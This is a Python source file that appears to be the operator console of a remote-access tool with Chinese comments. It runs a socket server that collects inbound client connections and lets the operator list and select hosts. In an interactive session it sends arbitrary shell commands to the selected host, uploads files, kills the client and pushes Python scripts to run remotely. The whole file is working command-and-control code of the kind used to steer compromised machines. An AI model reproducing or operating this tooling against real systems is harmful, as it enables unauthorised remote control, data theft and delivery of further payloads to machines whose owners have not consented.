import glob
import os
import shlex
import sys

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.realpath(__file__)))
sys.path.append(ROOT_DIR)

import threading

from core.server import Server
from util.common_util import parse, scan_args
from config.server import SOCKET_ADDR


# 服务端接受连接后的回调函数
def handler(conn, addr):
    server.accept(conn, addr)


# 接受命令输入
def accept_commands():
    while True:
        try:
            command = input('flc> ')
            if not command:
                continue
            # 退出服务端
            elif command in ['quit', 'exit']:
                server.socket.close()
                sys.exit(0)
            # 查看客户端列表
            elif command == 'list':
                server.test_connections()
                list_connections()
            # 连接到客户端
            elif 'select' in command:
                server.test_connections()
                connection = None
                try:
                    connection = server.connections[int(command.replace('select', ''))]
                except (ValueError, IndexError):
                    print('[-] Not a valid selection')
                if connection is not None:
                    open_connection(connection)
            # 快速连接到最近上线的客户端
            elif command == 'q':
                server.test_connections()
                connection = None
                try:
                    connection = server.connections[len(server.connections) - 1]
                except IndexError:
                    print('[-] No connection at this time')
                if connection is not None:
                    open_connection(connection)
            else:
                print('[-] Command not recognized')
        except KeyboardInterrupt:
            server.socket.close()
            sys.exit(0)
        except Exception as e:
            print('[-] Error: {}'.format(e))


# 查看已连接客户端列表
def list_connections():
    for i, connection in enumerate(server.connections):
        print('{}, {}:{} {}'.format(i, connection.address[0], connection.address[1], connection.info))


# 给客户端发送命令
def open_connection(connection):
    print('[+] Connected to {}'.format(connection.address))
    connection.send_command('null', 'null')
    cwd = connection.recv_result()[1]
    while True:
        try:
            command = input(cwd + '> ')
            functions = {'upload': upload, 'load': load}
            if not command:
                continue
            name, arg = parse(command)
            if command in ['quit', 'exit']:
                break
            elif command == 'kill':
                connection.send_command(command)
                break
            elif name in functions:
                if not functions[name](arg, connection):
                    continue
            else:
                connection.send_command(command)
            status, result = connection.recv_result()
            print(result)
            cwd = connection.recv_result()[1]
        except ConnectionResetError:
            print('[-] Connection closed')
            break
        except Exception as e:
            print('[-] {}'.format(e))


# 上传文件
def upload(arg, conn):
    if os.path.isfile(arg):
        conn.send_file(arg)
        return 1
    else:
        print('[-] File does not exist')
        return 0


# 加载脚本
def load(arg, conn):
    script_dir = os.path.join(ROOT_DIR, 'script')
    if not arg:
        for file in glob.iglob(os.path.join(script_dir, '**/*.py'), recursive=True):
            print(os.path.relpath(file, script_dir))
        return 0
    arg = shlex.split(arg)
    script_name = os.path.join(script_dir, arg[0])
    if not os.path.isfile(script_name):
        print('[-] File does not exist: {}'.format(script_name))
        return 0
    conn.send_script(script_name, scan_args(arg[1:]))
    return 1


if __name__ == '__main__':
    server = Server(SOCKET_ADDR)
    threading.Thread(target=server.serve, args=(handler,), daemon=True).start()
    accept_commands()
